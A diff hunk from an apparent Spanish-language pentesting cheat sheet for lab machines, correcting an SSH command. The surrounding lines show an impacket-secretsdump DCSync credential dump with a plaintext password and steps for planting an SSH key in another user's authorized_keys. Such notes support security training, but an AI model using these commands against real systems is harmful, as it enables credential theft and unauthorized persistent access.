@@ -159,7 +159,7 @@ impacket-secretsdump -just-dc melanie:Welcome123@10.10.10.169  -outputfile dcsyn
  ``
  ##SSH
  ``
-conectar por SSH ---> user@IP ---> te pide la pass luego
+conectar por SSH ---> ssh user@IP ---> te pide la pass luego
 ssh-keygen -f "user"  ---> crea tu key(llave) ssh-keygen -f "peterolord"
 echo "public key" > /home/susan/.ssh/authorized_keys  ---> mete tu keyn en el fichero del servidor authorizedkey para poder utilizarlo 
 ssh -i  peterolord(nombre llave) susan@10.10.11.253   ---> conecta tu maquina con el servidor mediante ssh, si tuvieras la contraseña de susan seria ->>
